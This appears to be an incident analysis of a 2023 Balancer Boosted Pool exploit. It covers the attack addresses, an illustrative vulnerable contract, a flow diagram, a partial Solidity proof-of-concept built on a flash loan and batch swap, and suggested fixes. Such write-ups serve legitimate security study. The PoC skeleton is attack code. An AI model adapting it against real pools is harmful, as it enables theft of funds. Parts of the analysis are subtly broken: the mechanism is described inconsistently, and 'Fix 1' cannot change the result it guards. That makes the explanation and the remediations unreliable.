# Balancer Precision Loss Price Manipulation Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | Balancer (bb-a-USD Boosted Pool) |
| Date | 2023-08-01 |
| Chain | Ethereum Mainnet |
| Loss | ~$2,000,000 USD |
| Attack Type | Precision Loss + Virtual Supply Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xed187f37e5ad87d5b3b2624c01de56c5862b7a9b` |
| Attack Contract | `0x2100dcd8758ab8b89b9b545a43a1e47e8e2944f0` |
| Vulnerable Contract | `0x9210f1204b5a24742eba12f710636d76240df3d0` (bb-a-USDC) |
| Attack TX | `0x2a027c8b915c3737942f512fc5d26fd15752d0332353b3059de771a35a606c2d` |
| Fork Block | 18,004,651 |

## 2. Vulnerability Code Analysis

Balancer's Boosted Pool uses the concept of virtual supply. By manipulating the Aave aUSDC reserve, a precision loss occurs in the virtual supply calculation, allowing the bb-a-USDC exchange rate to be manipulated.

```solidity
// Vulnerable pattern: price calculation based on virtual supply
contract BalancerBoostedPool {
    // Vulnerable: aToken balance changes are immediately reflected in virtualSupply
    function getVirtualSupply() public view returns (uint256) {
        // Calculation based on aUSDC balance (manipulable)
        uint256 aUSDCBalance = IERC20(aUSDC).balanceOf(address(this));
        return _totalSupply + aUSDCBalance;  // inflated via manipulated aUSDC
    }

    // Manipulated price used in batch swap
    function batchSwap(
        SwapKind kind,
        BatchSwapStep[] memory swaps,
        IAsset[] memory assets,
        FundManagement memory funds,
        int256[] memory limits,
        uint256 deadline
    ) external returns (int256[] memory assetDeltas) {
        // Exchange rate based on manipulated getVirtualSupply()
        // ...
    }
}
```

**Vulnerability**: Draining the aUSDC reserve in bulk causes the virtual supply to shrink abnormally, after which the bb-a-USDC price is artificially inflated in batch swaps, enabling profitable arbitrage.

### On-Chain Original Code

Source: Bytecode Decompilation

```solidity
// Root cause: precision loss + virtual supply manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xed187f37e5ad87d5b3b2624c01de56c5862b7a9b]
  │
  ├─1─▶ Aave V3.flashLoan() [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2]
  │      Borrow 300,000 USDC
  │
  ├─2─▶ Drain aUSDC reserve
  │      [bb-a-USDC: 0x9210f1204b5a24742eba12f710636d76240df3d0]
  │      → virtualSupply decreases → bb-a-USDC price rises
  │
  ├─3─▶ Execute Balancer batch swap
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      bb-a-USDC → bb-a-DAI → bb-a-USDT cycle
  │      Capture arbitrage profit at each step using the inflated bb-a-USDC price
  │
  ├─4─▶ Convert aDAI → DAI, aUSDT → USDT
  │      [aDAI: Aave aToken, aUSDT: Aave aToken]
  │
  ├─5─▶ Swap USDT → USDC back via Uniswap V3
  │
  └─6─▶ Repay Aave flash loan + realize ~$2M USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract BalancerExploit {
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // bb-a tokens
    IERC20 bbausdc = IERC20(0x9210f1204b5a24742eba12f710636d76240df3d0);
    IERC20 bbadai = IERC20(/* bb-a-DAI */);
    IERC20 bbausdt = IERC20(/* bb-a-USDT */);

    function testExploit() external {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 300_000e6;
        aaveV3.flashLoan(address(this), assets, amounts, new uint256[](1), address(this), "", 0);
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, ...) external returns (bool) {
        // Drain aUSDC reserve (decrease virtualSupply)
        _drainAUSDCReserve(amounts[0]);

        // Capture arbitrage profit via batch swap
        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](3);
        // bb-a-USDC → bb-a-DAI → bb-a-USDT cycle
        vault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_IN,
            swaps,
            /* assets, funds, limits */,
            block.timestamp
        );

        // Repay flash loan
        USDC.approve(address(aaveV3), amounts[0] + premiums[0]);
        return true;
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Precision Loss, Virtual Supply Manipulation |
| Impact Scope | Balancer bb-a-USD Boosted Pool |
| Explorer | [Etherscan](https://etherscan.io/address/0x9210f1204b5a24742eba12f710636d76240df3d0) |

## 6. Security Recommendations

```solidity
// Fix 1: Set a lower bound on virtual supply calculation
function getVirtualSupply() public view returns (uint256) {
    uint256 aUSDCBalance = IERC20(aUSDC).balanceOf(address(this));
    uint256 virtualSupply = _totalSupply + aUSDCBalance;

    // Guarantee minimum virtual supply
    uint256 minVirtualSupply = _totalSupply;
    return Math.max(virtualSupply, minVirtualSupply);
}

// Fix 2: Tighten batch swap slippage
// Restrict maximum loss via the limits parameter
int256[] memory limits = new int256[](assets.length);
for (uint i = 0; i < assets.length; i++) {
    limits[i] = int256(expectedAmount) * 99 / 100;  // 1% slippage
}

// Fix 3: Rate-limit aToken reserve changes
uint256 private _lastATokenBalance;
uint256 constant MAX_RESERVE_CHANGE_PER_BLOCK = 1_000_000e6; // max 1M USDC/block

function _checkReserveChange() internal {
    uint256 currentBalance = IERC20(aUSDC).balanceOf(address(this));
    uint256 change = currentBalance > _lastATokenBalance
        ? currentBalance - _lastATokenBalance
        : _lastATokenBalance - currentBalance;
    require(change <= MAX_RESERVE_CHANGE_PER_BLOCK, "Reserve change too fast");
    _lastATokenBalance = currentBalance;
}
```

## 7. Lessons Learned

1. **Boosted Pool Virtual Supply**: The virtual supply of Balancer's Boosted Pool depends on external protocol (Aave) aToken balances. This dependency introduces a new attack vector.
2. **Precision Loss and Finance**: Repeated precision loss in integer arithmetic can generate meaningful profits, especially in DeFi where large amounts are processed.
3. **Batch Swap Complexity**: Batch swaps that route through multiple pools can accumulate price calculation errors at each step, producing high-complexity vulnerabilities.
4. **aToken-Based Pool Risk**: Protocols that use Aave aTokens as internal assets must separately analyze the possibility of aToken price manipulation.